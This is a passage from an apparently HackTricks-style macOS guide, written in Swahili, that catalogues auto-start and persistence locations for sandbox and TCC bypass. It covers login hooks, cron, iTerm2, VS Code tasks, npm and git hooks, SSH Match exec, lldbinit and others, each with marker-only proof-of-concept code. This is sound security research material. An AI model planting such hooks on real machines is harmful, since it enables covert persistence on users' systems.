  - Unaweza kupata ufikiaji wa ziada wa TCC

#### Mahali

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Maelezo na Unyonyaji

QuickLook plugins zinaweza kutekelezwa unapofanya **hakikisho la faili** (bonyeza space bar faili ikiwa imechaguliwa katika Finder) na **plugin inayotumia aina hiyo ya faili** ikiwa imesakinishwa.<sup>[[8]](#references)</sup>

Unaweza kukompile QuickLook plugin yako mwenyewe, kuiweka katika mojawapo ya maeneo yaliyotajwa hapo awali ili ipakie, kisha uende kwenye faili inayotumika na ubonyeze space ili kuiendesha.

Njia hizi zinarejelea vifurushi vya zamani vya `.qlgenerator`; [mwongozo wa usanifu wa Quick Look wa Apple](https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/Quicklook_Programming_Guide/Articles/QLArchitecture.html) unaeleza mpangilio wa utafutaji na aina za faili zinazolingana. **App extensions** za sasa za Quick Look huwekwa pamoja na app na zina kanuni tofauti za usajili na utekelezaji. Kuwepo kwa generator hakuthibitishi kwamba itachaguliwa kwa aina husika au kwamba msimbo wake utaendeshwa ndani ya Finder yenyewe. Njia ya zamani ya generator ilikaguliwa kupitia nyaraka na uwepo wa saraka; hakuna generator iliyosakinishwa au kupakiwa kwenye Mac iliyotumika kwa utafiti.

### ~~Login/Logout Hooks~~

> [!CAUTION]
> Hii haikufanya kazi kwangu, iwe ni kwa LoginHook ya mtumiaji au LogoutHook ya root

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)<sup>[[9]](#references)</sup>

- Husaidia kukwepa sandbox: [✅](https://emojipedia.org/check-mark-button)
- Kukwepa TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- Unahitaji kuweza kutekeleza kitu kama `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
  - I`n`apatikana katika `~/Library/Preferences/com.apple.loginwindow.plist`

Zimeacha kutumika, lakini zinaweza kutumiwa kutekeleza amri mtumiaji anapoingia.<sup>[[9]](#references)</sup>

```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```

Mpangilio huu huhifadhiwa katika `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`

```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
    LoginHook = "/Users/username/hook.sh";
    LogoutHook = "/Users/username/hook.sh";
    MiniBuddyLaunch = 0;
    TALLogoutReason = "Shut Down";
    TALLogoutSavesState = 0;
    oneTimeSSMigrationComplete = 1;
}
```

Ili kuifuta:

```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```

Ya mtumiaji wa root imehifadhiwa katika **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Conditional Sandbox Bypass

> [!TIP]
> Hapa unaweza kupata maeneo ya kuanzia yanayofaa kwa **sandbox bypass**, yanayokuruhusu kutekeleza kitu kwa urahisi kwa **kukandika kwenye faili** na **kutegemea hali zisizo za kawaida sana** kama vile **programu mahususi zilizosakinishwa, vitendo vya mtumiaji "visivyo vya kawaida"** au mazingira.

### Cron

**Maelezo**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)<sup>[[10]](#references)</sup>

- Inafaa kwa bypass ya sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Hata hivyo, unahitaji kuwa na uwezo wa kutekeleza binary ya `crontab`
  - Au uwe root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- **`/usr/lib/cron/tabs/`**
  - Ruhusa za root zinahitajika ili kuandika moja kwa moja. Root haihitajiki ikiwa unaweza kutekeleza `crontab <file>`
  - **Kichochezi**: Ratiba iliyo kwenye crontab iliyosakinishwa. `at` na `periodic` ni mifumo tofauti iliyoelezwa hapa chini.

#### Maelezo na Unyonyaji

Orodhesha cron jobs za **mtumiaji wa sasa** kwa kutumia:

```bash
crontab -l
```

plist ya launchd ya daemon ya cron ya mfumo ina ingizo la `QueueDirectories` la `/usr/lib/cron/tabs`; hapo ndipo crontabs za watumiaji zilizosakinishwa huhifadhiwa. Kukagua crontabs za watumiaji wengine kunahitaji root:

```bash
plutil -p /System/Library/LaunchDaemons/com.vix.cron.plist
ls -ld /usr/lib/cron/tabs
```

Katika akaunti ya majaribio inayoweza kufutwa, unaweza kusakinisha entry ya cron ya mtumiaji yenye marker pekee kwa kutumia `crontab`, kisha kuiondoa baada ya kuiona. Kuendesha `crontab <file>` **hubadilisha crontab yote iliyopo ya akaunti**, kwa hivyo ihifadhi na uirejeshe ikiwa akaunti hiyo haiwezi kufutwa:<sup>[[10]](#references)</sup>

```bash
lab=$(mktemp -d)
had_original=0
if crontab -l > "$lab/original" 2>/dev/null; then had_original=1; fi
cleanup_cron_poc() {
  if [ "$had_original" -eq 1 ]; then crontab "$lab/original"; else crontab -r; fi
  rm -r "$lab"
}
trap cleanup_cron_poc EXIT
printf '* * * * * /usr/bin/touch %s/ran\n' "$lab" > "$lab/new"
crontab "$lab/new"
sleep 65
test -e "$lab/ran" && echo 'cron fired'
```

### iTerm2

Maelezo ya kiufundi: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)<sup>[[11]](#references)</sup>

- Inafaa kwa bypass ya sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - iTerm2 ilikuwa imewahi kupewa ruhusa za TCC

#### Maeneo

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
  - **Kichochezi**: Anzisha iTerm2 ikiwa na script ya Python API inayokidhi masharti katika folda hiyo
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
  - **Kichochezi**: Anzisha iTerm2; hook ya kuanzisha ya AppleScript imeandikwa kando
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
  - **Kichochezi**: Unda session kwa kutumia profile ambayo command au maandishi ya awali huendesha payload

#### Maelezo na Exploitation

[Mwongozo wa sasa wa iTerm2 Python API](https://iterm2.com/python-api/tutorial/running.html#auto-run-scripts) unaeleza scripts za **Python** zinazojiendesha katika `~/Library/Application Support/iTerm2/Scripts/AutoLaunch`. Haithibitishi kuwa faili yoyote ya `.sh` inayoweza kutekelezwa katika folda hiyo itaendeshwa. Kwa akaunti ya muda, hifadhi faili hii kama `~/Library/Application Support/iTerm2/Scripts/AutoLaunch/ht-marker.py`:

```python
import iterm2
from pathlib import Path

async def main(connection):
    Path('/tmp/ht-iterm-autolaunch-marker').touch()

iterm2.run_until_complete(main)
```

Mwongozo wa [sasa wa AppleScript wa iTerm2](https://iterm2.com/documentation-scripting.html) unaeleza kando `~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`, ukiwa na njia mbadala ya zamani ya `~/Library/Application Support/iTerm/Scripts/AutoLaunch.scpt` wakati folda ya kisasa haipo. AppleScript inayoweka alama pekee ni:

```applescript
do shell script "touch /tmp/iterm2-autolaunchscpt"
```

Mifano hii ya script ilikaguliwa kwa kulinganisha na nyaraka za iTerm2, lakini haikuendeshwa katika kipindi cha eneo-kazi kinachotumika. Baada ya kuijaribu katika akaunti ya majaribio inayoweza kutupwa, ondoa script ya majaribio na `/tmp/ht-iterm-autolaunch-marker` au `/tmp/iterm2-autolaunchscpt`, mtawalia.

Mapendeleo ya iTerm2 yaliyo katika **`~/Library/Preferences/com.googlecode.iterm2.plist`** yanaweza kubainisha amri ya wasifu au maandishi ya mwanzo. Maandishi ya mwanzo huandikwa kwenye kipindi; utekelezaji hutegemea shell kuyatafsiri. [Nyaraka za wasifu za iTerm2](https://iterm2.com/documentation-preferences-profiles-general.html) zinaeleza amri inayoendeshwa kipindi kipya chenye wasifu huo kinapoundwa.

Mpangilio huu unaweza kusanidiwa katika mipangilio ya iTerm2:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

Na amri hiyo inaonyeshwa katika mapendeleo:

```bash
plutil -p com.googlecode.iterm2.plist
{
  [...]
  "New Bookmarks" => [
    0 => {
      [...]
      "Initial Text" => "touch /tmp/iterm-start-command"
```

Kwa tathmini salama, kagua wasifu uliochagua kwenye mipangilio ya iTerm2 au soma nakala ya faili yake ya mapendeleo. Kubadilisha `Initial Text` kwenye wasifu unaotumika kutaathiri vipindi vya mtumiaji, kwa hivyo hakuna mapendeleo yaliyobadilishwa kwenye Mac ya utafiti.

### xbar

Maandishi: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)<sup>[[12]](#references)</sup>

- Inafaa kukwepa sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Lakini xbar lazima iwe imesakinishwa
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Huomba ruhusa za Accessibility

#### Mahali

- **`~/Library/Application\ Support/xbar/plugins/`**
  - **Kichochezi**: Mara xbar inapotekelezwa

#### Maelezo

Ikiwa programu maarufu ya [**xbar**](https://github.com/matryer/xbar) imesakinishwa, inawezekana kuandika shell script katika **`~/Library/Application\ Support/xbar/plugins/`** ambayo itatekelezwa xbar inapoanzishwa:<sup>[[12]](#references)</sup>

```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```

### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)<sup>[[13]](#references)</sup>

- Ni muhimu kwa bypass ya sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Lakini Hammerspoon lazima iwe imesakinishwa
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Huomba ruhusa za Accessibility

#### Location

- **`~/.hammerspoon/init.lua`**
  - **Trigger**: Hammerspoon inapotekelezwa

#### Description

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) ni jukwaa la automation la **macOS**, linalotumia **LUA scripting language** kwa shughuli zake. Muhimu zaidi, linaruhusu kuunganisha msimbo kamili wa AppleScript na kutekeleza shell scripts, hivyo kuboresha kwa kiasi kikubwa uwezo wake wa scripting.<sup>[[13]](#references)</sup>

Programu hutafuta faili moja, `~/.hammerspoon/init.lua`, na inapowashwa script hiyo hutekelezwa.

```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```

### BetterTouchTool

- Inafaa kupita sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Lakini BetterTouchTool lazima iwe imesakinishwa
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Huomba ruhusa za Automation-Shortcuts na Accessibility

#### Mahali

- Faili ya script **ambayo tayari imerejelewa** na preset ya BetterTouchTool iliyowezeshwa, au usanidi wa preset hiyo ulio chini ya `~/Library/Application Support/BetterTouchTool/`. Njia halisi ya script hutegemea jinsi preset ilivyosetiwa.

[Rejeleo la vitendo vya BetterTouchTool](https://docs.folivora.ai/docs/actions/action-definitions/) linaeleza vitendo vya shell-script na background-command. Tukio lililosetiwa la keyboard, mouse, touch, widget au aina nyingine lazima litokee wakati preset husika inatumika; [mwongozo wake wa trigger](https://docs.folivora.ai/docs/configuration/new-trigger/) unaonyesha uhusiano huo. Faili ya nasibu kwenye saraka ya application-support si trigger. Kitendo ambacho tayari kimesetiwa na kinachopakia script ya nje inayoweza kuandikwa ni lengo finyu zaidi la kuandika-kisha-kutekeleza. Code huendeshwa chini ya akaunti ya mtumiaji wa BetterTouchTool, kwa kuzingatia ruhusa zake halisi za macOS. BetterTouchTool haikuwepo kwenye `/Applications` kwenye Mac ya utafiti, kwa hiyo hakuna preset iliyobadilishwa au kutekelezwa hapo.

### Alfred

- Inafaa kupita sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Lakini Alfred lazima iwe imesakinishwa
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Huomba ruhusa za Automation, Accessibility na hata Full-Disk access

#### Mahali

- Script au faili **ambayo tayari imerejelewa** na workflow ya Alfred iliyosakinishwa, au workflow hiyo ndani ya saraka ya `Alfred.alfredpreferences` iliyosanidiwa na mtumiaji. Saraka ya preferences inaweza kusawazishwa na haina njia moja ya kudumu kwa wote.

[Mwongozo wa workflow wa Alfred](https://www.alfredapp.com/help/workflows/) unaeleza sharti la Powerpack na usakinishaji kupitia UI yake. Trigger ya hotkey, keyword au aina nyingine iliyosanidiwa kwenye workflow iliyosakinishwa lazima iwashwe; [mfano wa hotkey wa Alfred](https://www.alfredapp.com/help/workflows/triggers/hotkey/creating-a-hotkey-workflow/) unaonyesha kitendo cha script. [Rejeleo la mazingira la Alfred](https://www.alfredapp.com/help/workflows/script-environment-variables/) linaonyesha njia ya preferences iliyochaguliwa kama `alfred_preferences`. Kuweka faili ya workflow ambayo haijasajiliwa kwenye saraka ya nasibu hakuthibitishi kwamba itasakinishwa au kuendeshwa. Code huendeshwa kama mtumiaji aliyeingia kwenye Alfred, kwa kuzingatia ruhusa zake halisi za macOS. Alfred haikuwepo kwenye `/Applications` kwenye Mac ya utafiti, kwa hiyo njia hii ilitathminiwa kwa kutumia nyaraka pekee.

### Raycast Script Commands na kuonyesha upya extension

- **Lengo la kuandika:** Script inayoweza kutekelezwa katika saraka **ambayo tayari imeongezwa** chini ya Raycast Settings → Script Commands. Raycast haichanganui saraka mpya ya nasibu. [Mwongozo wa Script Commands wa Raycast](https://manual.raycast.com/script-commands) unaeleza usajili wa saraka.
- **Trigger na utambulisho:** Mtumiaji huendesha command iliyo katika faharasa, hotkey au fallback iliyosanidiwa huiendesha, au Raycast huonyesha upya script ya `inline` kwa kutumia `@raycast.refreshTime` yake iliyosanidiwa. Script huendeshwa kama mtumiaji aliyeingia kwenye Raycast kupitia interpreter yake. [Rejeleo la metadata la upstream](https://github.com/raycast/script-commands#metadata) linazuia kuonyesha upya kiotomatiki kwa commands za inline pekee, na [manifest ya extension ya Raycast](https://github.com/raycast/extensions/blob/main/docs/information/manifest.md) inaunga mkono kando `interval` kwa commands za extension zilizosakinishwa za `no-view` au `menu-bar`. Kuongeza tu command ya kawaida ya script hakuipangii ratiba ya kuendeshwa.

Kwa akaunti ya muda yenye saraka ya script iliyosajiliwa, script ya inline inayoweka alama pekee ni:

```bash
#!/bin/bash
# @raycast.schemaVersion 1
# @raycast.title Auto-start marker
# @raycast.mode inline
# @raycast.refreshTime 1m
/usr/bin/touch /tmp/ht-raycast-refresh-marker
echo ready
```

Ihifadhi kwenye saraka iliyosajiliwa, ifanye iweze kutekelezwa, kisha uruhusu Raycast ijisasishe. Halafu futa faili hiyo na `/tmp/ht-raycast-refresh-marker`. Raycast haikupatikana kwa jina lake la kawaida la `/Applications` kwenye Mac ya utafiti, kwa hivyo maelezo haya yamethibitishwa na nyaraka na hayakutekelezwa hapo. Ruhusa za Accessibility, Automation na faili bado hutegemea madirisha ya ruhusa ya macOS.

### Kazi za kiotomatiki za workspace katika Visual Studio Code

- **Lengo la kuandika:** `.vscode/tasks.json` ndani ya workspace ambayo mtumiaji atafungua.
- **Kichochezi:** Kufungua workspace hiyo katika VS Code, lakini tu ikiwa folda imeaminiwa **na** kazi za kiotomatiki zimeruhusiwa. Workspace isiyoaminika haiwahi kutekeleza kazi za kiotomatiki; kwa chaguomsingi, mpangilio humwuliza mtumiaji kabla ya utekelezaji wa kwanza wa kiotomatiki. [Nyaraka za kazi za VS Code](https://code.visualstudio.com/docs/debugtest/tasks#_run-behavior) na [Nyaraka za Workspace Trust](https://code.visualstudio.com/docs/editing/workspaces/workspace-trust) zinaeleza masharti yote mawili.
- **Utambulisho wa utekelezaji:** Akaunti ya mtumiaji wa VS Code, kupitia mchakato wa kazi uliosanidiwa. Huu ni utekelezaji mahususi wa programu, si udumishaji wa kuingia.

Katika **workspace mpya ya majaribio inayoweza kutupwa**, weka kazi hii ya alama pekee ndani ya `.vscode/tasks.json`:

```json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "autostart-marker",
      "type": "process",
      "command": "/usr/bin/touch",
      "args": ["${workspaceFolder}/.autostart-task-ran"],
      "problemMatcher": [],
      "runOptions": { "runOn": "folderOpen" }
    }
  ]
}
```

Baada ya kufungua workspace inayoaminika na kuruhusu kazi za kiotomatiki, angalia `.autostart-task-ran`. Ondoa ingizo la kazi na faili ya alama ili kusafisha. **Hili lilithibitishwa kwa kutumia nyaraka za Microsoft na kifurushi kilichosakinishwa cha VS Code 1.139.1; halikuendeshwa katika kipindi amilifu cha eneo-kazi.**

### Chrome native messaging hosts

- **Lengo la kuandikia:** `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/<host-name>.json` kwa mtumiaji wa sasa, au `/Library/Google/Chrome/NativeMessagingHosts/<host-name>.json` kwa watumiaji wote (ruhusa za admin zinahitajika kuandika). Chromium na Chrome for Testing hutumia folda tofauti; angalia [jedwali la sasa la njia za Chrome](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging#native-messaging-host-location).
- **Kichocheo:** Kiendelezi cha Chrome kilichosakinishwa na ruhusa ya `nativeMessaging` huita `chrome.runtime.connectNative()` au `chrome.runtime.sendNativeMessage()` kwa kutumia jina halisi la host lililo kwenye manifest. Kisha Chrome huanzisha executable ya host. Kufungua Chrome pekee hakuendeshi host mpya ya native kiholela; kuunda manifest bila kiendelezi kinachoiita hakufanyi chochote. [Mwongozo wa native messaging wa Chrome](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging) unaeleza utaratibu huu wa mawasiliano.
- **Utambulisho wa utekelezaji:** Akaunti ya mtumiaji wa Chrome. Manifest lazima itaje njia kamili ya executable na iruhusu wazi origin ya kiendelezi kinachoiita.

Katika akaunti ya kivinjari inayoweza kutupwa pamoja na kiendelezi cha majaribio, jozi ifuatayo ya faili inaonyesha uhusiano kati ya kuandika na kutekeleza. Jina la faili la manifest lazima lilingane na `name` yake, na `TEST_EXTENSION_ID` lazima ibadilishwe na ID halisi ya kiendelezi hicho:

```json
{
  "name": "org.hacktricks.marker",
  "description": "Native messaging marker test",
  "path": "/absolute/path/to/ht-native-host.sh",
  "type": "stdio",
  "allowed_origins": ["chrome-extension://TEST_EXTENSION_ID/"]
}
```

Hifadhi JSON hii kama `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/org.hacktricks.marker.json`. Faili ya executable inayotumika kwa marker pekee iliyo kwenye `path` ya manifest inaweza kuwa na:

```sh
#!/bin/sh
/usr/bin/touch "$HOME/Library/Caches/ht-native-host-ran"
exit 0
```

Baada ya extension ya majaribio kuita `chrome.runtime.sendNativeMessage('org.hacktricks.marker', {ping: 1})` kutoka kwa service worker au ukurasa wa extension, marker huthibitisha kuwa host imeanza. Host hii ndogo haitekelezi protocol ya majibu ya Chrome yenye urefu uliotangulizwa, kwa hiyo extension inaweza kuripoti hitilafu ya utumaji ujumbe baada ya marker kuandikwa. Ondoa manifest ya majaribio, host na marker ili kusafisha. Kwenye macOS 26.5.2, programu ya Chrome na saraka zote mbili za manifest zilikuwepo; **wasifu wa Chrome uliokuwa unatumika haukubadilishwa wala kutumika**.

### Amri za matukio ya vitufe za Karabiner-Elements

- **Lengo la kuandika:** `~/.config/karabiner/karabiner.json` katika akaunti ambayo Karabiner-Elements imesakinishwa na inaendeshwa. [Mwongozo wa Karabiner kuhusu mahali pa faili](https://karabiner-elements.pqrs.org/docs/json/location/) unasema programu hufuatilia faili hii na kuipakia upya baada ya kuandikwa. Faili za JSON katika `assets/complex_modifications` ni mipangilio iliyowekwa tayari ambayo inaweza kuletwa tu; kuandika faili hapo pekee hakuwezeshi rule.
- **Kichochezi:** Tukio la kitufe lililosanidiwa baada ya rule kuanza kutumika. [Rejeleo la `to.shell_command`](https://karabiner-elements.pqrs.org/docs/json/complex-modifications-manipulator-definition/to/shell-command/) linaeleza utekelezaji wa amri. Huu si utekelezaji wa code wakati wa kuingia au kila faili inapoandikwa.
- **Utambulisho wa utekelezaji:** Mtumiaji aliyeingia anayeendesha mchakato wa mtumiaji wa Karabiner. Ruhusa zake na ufikiaji wowote wa TCC hutegemea programu na toleo lake.

Kwa akaunti ya majaribio inayoweza kutupwa, ongeza object hii ya rule kwenye array ya `complex_modifications.rules` ya wasifu uliochaguliwa katika `karabiner.json`, huku ukihifadhi sehemu nyingine za wasifu huo. Bonyeza F18 ili kuunda marker isiyo na madhara, kisha ondoa rule hii na marker. Kuchagua F18 huepusha kubadilisha kitufe cha kawaida cha kuandika:

```json
{
  "description": "Write a marker on F18",
  "manipulators": [
    {
      "type": "basic",
      "from": { "key_code": "f18" },
      "to": [
        { "shell_command": "/usr/bin/touch /tmp/ht-karabiner-f18" }
      ]
    }
  ]
}
```

Karabiner-Elements haikuwa imesakinishwa kwenye `/Applications` kwenye mashine ya majaribio ya macOS 26.5.2, kwa hivyo hii ni PoC inayotegemea nyaraka badala ya matokeo ya uendeshaji wa ndani.

### Git hooks kwenye repository ya ndani

- **Lengo la kuandikia:** Hook inayoweza kutekelezwa kama `<repo>/.git/hooks/post-checkout`. Ikiwa `core.hooksPath` tayari imewekwa, tumia saraka iliyosanidiwa badala yake. Hook iliyowekwa kwenye commit kama faili ya kawaida ya source inayofuatiliwa haisakinishwi kiotomatiki kwenye clone.
- **Kichochezi:** Operesheni husika ya Git. Kwa mfano, `post-checkout` huendeshwa baada ya `git checkout` au `git switch`, na inaweza pia kuendeshwa baada ya kuunda clone au worktree. [Marejeleo ya Git kuhusu hooks](https://git-scm.com/docs/githooks) yanaorodhesha matukio na sharti la ruhusa ya kutekeleza; [`core.hooksPath`](https://git-scm.com/docs/git-config#Documentation/git-config.txt-corehooksPath) hubadilisha saraka inayotafutwa.
- **Utambulisho wa utekelezaji:** Akaunti inayoendesha Git. Hook inaweza kutekelezwa tu ikiwa saraka ya hooks inayotumika kwa repository inaweza kuandikiwa na mtendaji na mtumiaji baadaye anafanya operesheni husika ya Git.

PoC hii ya kuweka alama pekee huunda repository ya muda mfupi kabisa, husakinisha hook moja, kisha hubadilisha branch. Ilitekelezwa kwa mafanikio kwa kutumia Apple Git 2.50.1 kwenye macOS 26.5.2:

```bash
lab=$(mktemp -d)
git -C "$lab" init -q
git -C "$lab" -c user.name=Test -c user.email=test@example.invalid \
  commit --allow-empty -qm baseline
cat > "$lab/.git/hooks/post-checkout" <<EOF
#!/bin/sh
/usr/bin/touch "$lab/ran"
EOF
chmod 700 "$lab/.git/hooks/post-checkout"
git -C "$lab" checkout -qb probe
test -e "$lab/ran" && echo 'post-checkout fired'
rm -r "$lab"
```

### Skripti za lifecycle za npm katika mradi

- **Lengo la kuandikia:** Ramani ya `scripts` katika `package.json` ya mradi unaoweza kuandikwa, au kifurushi cha dependency kilichosakinishwa ambacho mtumiaji ataendesha skripti yake ya lifecycle. Hii ni hook ya mtiririko wa kazi ya uundaji, si utekelezaji unaotokana na kufungua saraka.
- **Kichochezi na utambulisho:** Baadaye, `npm install` au `npm ci` ikiwa skripti za lifecycle zimeruhusiwa, huendesha `preinstall`, `install` na `postinstall` kwa ruhusa za mtumiaji anayeendesha npm. `npm run <name>` ya kawaida pia huendesha skripti zinazolingana za `pre<name>` na `post<name>`. [Rejeleo la lifecycle la npm](https://docs.npmjs.com/cli/v11/using-npm/scripts) linaorodhesha matukio; [`ignore-scripts`](https://docs.npmjs.com/cli/v11/commands/npm-install#ignore-scripts) inaweza kuzuia skripti za lifecycle za usakinishaji. Mipangilio ya toleo na sera inaweza kubadilisha kinachoruhusiwa, kwa hivyo angalia toleo la npm lengwa.

PoC hii ya kuweka alama pekee iliendeshwa kwa npm ya ndani katika saraka tupu ya muda. Haipakui dependencies wala kubadilisha mradi wa mtumiaji:

```bash
lab=$(mktemp -d)
cat > "$lab/package.json" <<'EOF'
{"name":"ht-autostart-marker","version":"1.0.0","private":true,
 "scripts":{"preinstall":"touch marker-preinstall","postinstall":"touch marker-postinstall"}}
EOF
(cd "$lab" && npm install --ignore-scripts=false --no-audit --no-fund --offline)
test -e "$lab/marker-preinstall" && test -e "$lab/marker-postinstall" && echo 'both lifecycle hooks fired'
rm -r "$lab"
```

Hii ni tofauti na faili za uanzishaji za mkalimani wa Python: npm lazima itekeleze kitendo husika cha kusakinisha au kuendesha, ilhali msimbo wa Python `site` unaweza kupakiwa wakati wa uanzishaji wa kawaida wa mkalimani. Malengo ya jumla ya `Makefile` na ufafanuzi wa kazi za build pia huhitaji mtumiaji au zana ambayo tayari imesanidiwa iite lengo hilo; si njia tofauti za auto-start za OS.

### Usanidi wa uanzishaji wa Vim

- **Lengo la kuandika:** `~/.vimrc` ya mtumiaji atakayeanzisha Vim (au faili nyingine ya uanzishaji iliyochaguliwa kulingana na mpangilio wa uanzishaji wa Vim). [Rejeleo la uanzishaji la Vim](https://vimhelp.org/starting.txt.html) linaeleza faili hiyo na ubadilishaji wa `VIMINIT`/`EXINIT`.
- **Kichocheo:** Uanzishaji wa kawaida unaofuata wa Vim ambao hupakia usanidi huu. Vim's `-u NONE` huruka vimrc ya mtumiaji. Huu ni utekelezaji maalum wa kihariri, si kichocheo cha kuingia kwenye OS.
- **Utambulisho wa utekelezaji:** Akaunti ya mtumiaji wa Vim.

PoC ifuatayo iliyotengwa ilitekelezwa dhidi ya macOS `/usr/bin/vim`; haiandiki mapendeleo halisi ya Vim wala nyaraka zilizo wazi:

```bash
lab=$(mktemp -d)
printf 'call writefile(["ran"], "%s/marker")\n' "$lab" > "$lab/.vimrc"
env -u VIMINIT -u EXINIT HOME="$lab" /usr/bin/vim -c 'qa!' >/dev/null 2>&1
test -e "$lab/marker" && echo 'vimrc fired'
rm -r "$lab"
```

Neovim ina njia tofauti ya usanidi wa mtumiaji, `$XDG_CONFIG_HOME/nvim/init.lua` au `init.vim`, na pia hupakia scripts katika saraka zake za `plugin/` za runtime kulingana na [startup documentation](https://neovim.io/doc/user/starting/). Neovim haikuwa imesakinishwa kwenye mashine ya majaribio ya macOS 26.5.2, kwa hiyo toleo hili halikujaribiwa hapo.

### Amri za usanidi wa SSH client

- **Lengo la kuandika:** `~/.ssh/config`, au faili nyingine ambayo tayari imejumuishwa humo. Hii ni faili ya usanidi wa **client**; ni tofauti na `~/.ssh/rc` ya upande wa server iliyoelezwa hapa chini.
- **Kichochezi:** Utekelezaji wa `ssh` unaolingana. `Match exec` huendesha amri ya ndani wakati client inatathmini usanidi wake, hata kwa `ssh -G`, ambayo huchapisha usanidi bila kuunganisha. `ProxyCommand` huendeshwa wakati client inapoanzisha muunganisho unaolingana. `LocalCommand` huendeshwa tu baada ya muunganisho kufanikiwa na inahitaji `PermitLocalCommand yes` (chaguo-msingi ni `no`). Hizi hutofautiana katika muda wa kuendeshwa na masharti ya awali; kuandika faili pekee hakuzitekelezi. Tazama nyaraka za upstream [OpenSSH `ssh_config(5)`](https://github.com/openssh/openssh-portable/blob/master/ssh_config.5).
- **Utambulisho wa utekelezaji:** Mtumiaji wa ndani anayeendesha `ssh`. Host inayolingana, faili ya usanidi inayotumika, na muunganisho wowote unaohitajika ni muhimu. `ssh -F` inaweza kuchagua faili tofauti ya usanidi.

PoC hii ya alama pekee iliendeshwa kwa SSH client ya Apple kwenye macOS 26.5.2. `-G` hujaribu `Match exec` bila kuanzisha muunganisho wa mtandao au kusoma usanidi halisi wa SSH wa mtumiaji:

```bash
lab=$(mktemp -d)
cat > "$lab/config" <<EOF
Match host example.invalid exec "/usr/bin/touch $lab/marker"
    User nobody
EOF
ssh -G -F "$lab/config" example.invalid >/dev/null
test -e "$lab/marker" && echo 'Match exec fired'
rm -r "$lab"
```

### Faili za uanzishaji wa Debugger

- **Lengo la uandishi:** `~/.lldbinit` au faili mahususi ya programu yenye kipaumbele cha juu zaidi, kama vile `~/.lldbinit-lldb`. LLDB husoma faili moja wakati Debugger inapoanzishwa. `.lldbinit` iliyo kwenye saraka ya sasa **haiendeshwi** kwa chaguomsingi; mtumiaji lazima awashe `target.load-cwd-lldbinit` au atumie `--local-lldbinit`. Tazama [mwongozo wa LLDB](https://lldb.llvm.org/man/lldb.html).
- **Kichochezi na utambulisho:** Mtumiaji huanzisha LLDB bila `--no-lldbinit`; amri huendeshwa kama mtumiaji huyo. Kufungua tu mradi hakumaanishi kuwa `.lldbinit` ya mradi itaendeshwa.

Jaribio lifuatalo la alama pekee lilitekelezwa kwenye LLDB kwenye macOS 26.5.2, likitumia home na saraka ya kufanya kazi zilizotengwa:

```bash
lab=$(mktemp -d)
printf 'script open("%s/marker", "w").write("ran")\n' "$lab" > "$lab/.lldbinit"
(cd "$lab" && HOME="$lab" lldb -b -o quit >/dev/null)
test -e "$lab/marker" && echo 'lldbinit fired'
rm -r "$lab"
```

Kwa **GDB**, [nyaraka za upstream kuhusu uanzishaji](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Startup.html) zinataja `$HOME/Library/Preferences/gdb/gdbinit` na kisha `~/.gdbinit` kwenye macOS. Faili ya `.gdbinit` kwenye saraka ya sasa inategemea [auto-load safe path](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Auto_002dloading-safe-path.html), na `-nx`/`-nh` huzuia faili za uanzishaji. GDB haikuwa imesakinishwa kwenye Mac ya majaribio, kwa hivyo toleo hili halikujaribiwa hapa.

### SSHRC

